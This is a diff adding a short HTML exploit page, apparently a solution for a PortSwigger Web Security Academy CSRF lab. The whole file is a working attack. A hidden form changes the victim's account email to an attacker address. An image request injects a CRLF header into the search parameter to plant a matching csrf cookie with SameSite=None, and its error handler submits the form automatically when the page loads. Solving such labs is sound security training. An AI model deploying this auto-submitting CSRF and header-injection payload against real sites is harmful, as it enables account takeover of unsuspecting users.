@@ -1,0 +1,9 @@
+<html>
+  <body>
+    <form action="https://<LAB ID>.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="pwned&#64;evil&#45;user&#46;net" />
+      <input type="hidden" name="csrf" value="<CSRF COOKIE>" />
+    </form>
+    <img src="https://<LAB ID>.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=<CSRF COOKIE>%3b%20SameSite=None" onerror="document.forms[0].submit()">
+  </body>
+</html>
